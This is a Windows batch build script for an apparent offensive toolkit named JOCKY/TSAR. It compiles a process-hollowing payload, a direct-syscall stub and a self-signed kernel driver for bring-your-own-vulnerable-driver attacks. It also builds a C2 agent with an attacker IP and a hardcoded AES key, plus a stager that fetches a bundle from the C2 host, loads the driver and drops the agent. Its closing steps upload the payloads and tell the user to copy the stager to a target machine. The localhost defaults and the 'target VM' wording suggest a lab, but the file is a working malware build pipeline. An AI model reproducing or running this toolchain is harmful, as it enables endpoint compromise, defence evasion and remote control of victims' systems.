@echo off
setlocal EnableDelayedExpansion

echo.
echo ============================================
echo   JOCKY / TSAR Build System
echo ============================================
echo.

set ROOT=%~dp0
set ERRORS=0

:: --- Load .env -------------------------------------------------------
set ENV_FILE=%ROOT%endpoint-management-server\.env
set JOCKY_C2_HOST=127.0.0.1
set JOCKY_ATTACKER_IP=127.0.0.1
set JOCKY_AES_KEY=6a6f636b795f6465765f6165735f6b65795f6a6f636b795f6465765f6165736b

if not exist "%ENV_FILE%" goto env_missing
for /f "usebackq tokens=1,* delims==" %%A in ("%ENV_FILE%") do (
    if "%%A"=="JOCKY_C2_HOST"     set "JOCKY_C2_HOST=%%B"
    if "%%A"=="JOCKY_ATTACKER_IP" set "JOCKY_ATTACKER_IP=%%B"
    if "%%A"=="JOCKY_AES_KEY"     set "JOCKY_AES_KEY=%%B"
)
echo [*] Loaded config from .env
echo     C2_HOST     = %JOCKY_C2_HOST%
echo     ATTACKER_IP = %JOCKY_ATTACKER_IP%
goto env_done
:env_missing
echo [!] .env not found, using defaults
:env_done
echo.

:: --- Bootstrap MSVC --------------------------------------------------
set "VCVARS=C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat"
where cl >nul 2>&1
if %ERRORLEVEL% EQU 0 goto msvc_ready
if not exist "%VCVARS%" goto msvc_missing
echo [*] Setting up MSVC environment...
call "%VCVARS%"
goto msvc_ready
:msvc_missing
echo [-] Cannot find vcvars64.bat. Run from a Developer Command Prompt.
exit /b 1
:msvc_ready

:: --- WDK paths -------------------------------------------------------
set "WDK_INC=C:\Program Files (x86)\Windows Kits\10\Include\10.0.28000.0\km"
set "WDK_INC_SHARED=C:\Program Files (x86)\Windows Kits\10\Include\10.0.28000.0\shared"
set "WDK_LIB=C:\Program Files (x86)\Windows Kits\10\Lib\10.0.28000.0\km\x64"

:: -------------------------------------------------------------------
:: 1. PAYLOAD
:: -------------------------------------------------------------------
echo [*] Building payload.exe...
cd /d "%ROOT%processhollowing"

cl /nologo /O2 /GS- /MT payload.cpp /link /SUBSYSTEM:WINDOWS /ENTRY:payload_entry /NODEFAULTLIB /OUT:payload.exe ws2_32.lib kernel32.lib

if %ERRORLEVEL% NEQ 0 (
    echo [-] payload.exe FAILED
    set ERRORS=1
) else (
    echo [+] payload.exe OK
    dumpbin /headers payload.exe | findstr "entry point"
    copy /Y payload.exe "C:\Users\Public\payload.exe" >nul
    echo [+] Copied to C:\Users\Public\payload.exe
)
echo.

:: -------------------------------------------------------------------
:: 2. SYSCALL STUB
:: -------------------------------------------------------------------
echo [*] Assembling syscall_stub.asm...
cd /d "%ROOT%directSyscall"

ml64 /nologo /c /Fo syscall_stub.obj syscall_stub.asm

if %ERRORLEVEL% NEQ 0 (
    echo [-] syscall_stub.asm FAILED
    set ERRORS=1
) else (
    echo [+] syscall_stub.obj OK
)
echo.

:: -------------------------------------------------------------------
:: 3. DRIVER (kernel mode - requires WDK)
:: -------------------------------------------------------------------
echo [*] Building driver.sys...
cd /d "%ROOT%byovd\driver"

if not exist "%WDK_INC%\ntddk.h" goto driver_skip

cl /nologo /kernel /O2 /GS- /GL /Gz /I "%WDK_INC%" /I "%WDK_INC_SHARED%" /I "..\shared" /D _AMD64_ /D AMD64 /D _WIN64 /D NDEBUG driver.c /link /DRIVER /NODEFAULTLIB /SUBSYSTEM:NATIVE /ENTRY:DriverEntry /OUT:driver.sys /LIBPATH:"%WDK_LIB%" ntoskrnl.lib

if %ERRORLEVEL% NEQ 0 (
    echo [-] driver.sys FAILED
    set ERRORS=1
) else (
    echo [+] driver.sys OK
    signtool sign /fd sha256 /s My /n "JockyDriver" driver.sys >nul 2>&1
    if %ERRORLEVEL% NEQ 0 (
        echo [!] driver.sys signing FAILED - check JockyDriver cert in certmgr.msc
        set ERRORS=1
    ) else (
        echo [+] driver.sys signed OK
    )
)
goto driver_done
:driver_skip
echo [!] WDK headers not found - skipping driver.sys
echo     Install WDK 10.0.28000.0 or build from a WDK-enabled prompt.
:driver_done
echo.

:: -------------------------------------------------------------------
:: 4. CLIENT (standalone BYOVD tester)
:: -------------------------------------------------------------------
echo [*] Building client.exe...
cd /d "%ROOT%byovd\client"

cl /nologo /O2 /MT client_main.cpp client.cpp ..\..\processhollowing\hollow.cpp "%ROOT%directSyscall\syscall_stub.obj" /I "..\shared" /link /SUBSYSTEM:CONSOLE /OUT:client.exe kernel32.lib advapi32.lib ntdll.lib

if %ERRORLEVEL% NEQ 0 (
    echo [-] client.exe FAILED
    set ERRORS=1
) else (
    echo [+] client.exe OK
)
echo.

:: -------------------------------------------------------------------
:: 5. JOCKY AGENT
:: -------------------------------------------------------------------
echo [*] Building jocky_agent.exe...
cd /d "%ROOT%directSyscall"

cl /nologo /O2 /MT /DC2_HOST=L\"%JOCKY_C2_HOST%\" /DATTACKER_IP=\"%JOCKY_ATTACKER_IP%\" /DAES_KEY_HEX=\"%JOCKY_AES_KEY%\" agent.cpp ..\byovd\client\client.cpp ..\processhollowing\hollow.cpp syscall_stub.obj /I "..\byovd\shared" /link /SUBSYSTEM:CONSOLE /OUT:jocky_agent.exe ws2_32.lib winhttp.lib crypt32.lib bcrypt.lib kernel32.lib advapi32.lib ntdll.lib

if %ERRORLEVEL% NEQ 0 (
    echo [-] jocky_agent.exe FAILED
    set ERRORS=1
) else (
    echo [+] jocky_agent.exe OK
)
echo.

:: -------------------------------------------------------------------
:: 6. STAGER
:: Stager no longer runs the hollow/BYOVD pipeline itself — it only
:: fetches the bundle, loads the driver, drops jocky_agent.exe and exits.
:: No dependency on hollow.cpp, client.cpp, or syscall_stub.obj.
:: -------------------------------------------------------------------
echo [*] Building stager.exe...
cd /d "%ROOT%stager"

cl /nologo /O2 /MT /DC2_HOST=L\"%JOCKY_C2_HOST%\" /DAES_KEY_HEX=\"%JOCKY_AES_KEY%\" stager.cpp /link /SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup /OUT:stager.exe winhttp.lib crypt32.lib bcrypt.lib kernel32.lib advapi32.lib

if %ERRORLEVEL% NEQ 0 (
    echo [-] stager.exe FAILED
    set ERRORS=1
) else (
    echo [+] stager.exe OK
)
echo.

:: -------------------------------------------------------------------
:: 7. BUNDLE  (requires jocky_agent.exe + driver.sys)
:: -------------------------------------------------------------------
cd /d "%ROOT%"
echo [*] Building bundle.bin...

where python >nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    echo [!] python not found - skipping bundle.bin
    goto bundle_done
)

if not exist "%ROOT%directSyscall\jocky_agent.exe" (
    echo [!] jocky_agent.exe missing - skipping bundle.bin
    goto bundle_done
)
if not exist "%ROOT%byovd\driver\driver.sys" (
    echo [!] driver.sys missing - skipping bundle.bin
    goto bundle_done
)

python "%ROOT%build_bundle.py"

if %ERRORLEVEL% NEQ 0 (
    echo [-] bundle.bin FAILED
    set ERRORS=1
) else (
    echo [+] bundle.bin OK
)
:bundle_done
echo.

:: -------------------------------------------------------------------
:: SUMMARY
:: -------------------------------------------------------------------
echo ============================================
if %ERRORS%==0 (
    echo   BUILD SUCCESSFUL
    echo.
    echo   Outputs:
    echo     processhollowing\payload.exe
    echo     byovd\driver\driver.sys  [signed]
    echo     byovd\client\client.exe
    echo     directSyscall\jocky_agent.exe
    echo     stager\stager.exe
    echo     bundle.bin
    echo     C:\Users\Public\payload.exe  [auto-copied]
    echo.
    echo   Next steps:
    echo     jocky ^> bundle upload --file bundle.bin
    echo     jocky ^> payload upload --file processhollowing\payload.exe
    echo     [copy stager\stager.exe to target VM]
) else (
    echo   BUILD COMPLETED WITH ERRORS
    echo   Fix errors above and rebuild.
)
echo ============================================
echo.

cd /d "%ROOT%"
endlocal